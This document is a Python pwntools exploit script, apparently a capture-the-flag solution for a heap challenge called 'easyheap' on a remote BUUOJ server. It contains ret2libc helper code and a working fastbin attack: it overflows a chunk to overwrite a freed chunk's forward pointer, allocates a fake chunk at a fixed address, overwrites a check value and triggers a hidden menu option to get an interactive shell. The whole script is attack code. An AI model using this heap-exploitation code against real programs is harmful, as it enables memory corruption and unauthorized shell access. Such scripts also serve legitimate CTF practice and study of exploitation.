from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')

binary = './easyheap'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',28677) if argv[1]=='r' else process(binary)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def dbg():
	gdb.attach(p)
	pause()
# start
def add(len,content=b'a'):
    sla(b':',b'1')
    sla(b':',int2bytes(len))
    sa(b':',content)
#
# def show(index):
#     sla(b':',b'3')
#     sla(b':',int2bytes(index))

def edit(index,len,content):
    sla(b':',b'2')
    sla(b':',int2bytes(index))
    sla(b':',int2bytes(len))
    sa(b':',content)

def delete(index):
    sla(b':',b'3')
    sla(b':',int2bytes(index))

add(0x68,b'aaaa') #0
add(0x68,b'bbbb') #1
add(0x68,b'cccc') #2
# dbg()
delete(2)#2
payload = b'/bin/sh\x00' + b'a' * 0x60 + p64(0x71) + p64(0x6020ad)  #0x71是size域，0x68大小的chunk实际上只有0x60+下一个chunk的pre_size域
edit(1,len(payload),payload) # 1
# dbg()
add(0x68,b'cccc') #2

payload = b'a' * 0x3 + p32(0x1306)
add(0x68,payload) #3 -- 0x6020ad fake_chunk
p.sendlineafter(b'choice :',b'4869')
p.interactive()

# itr()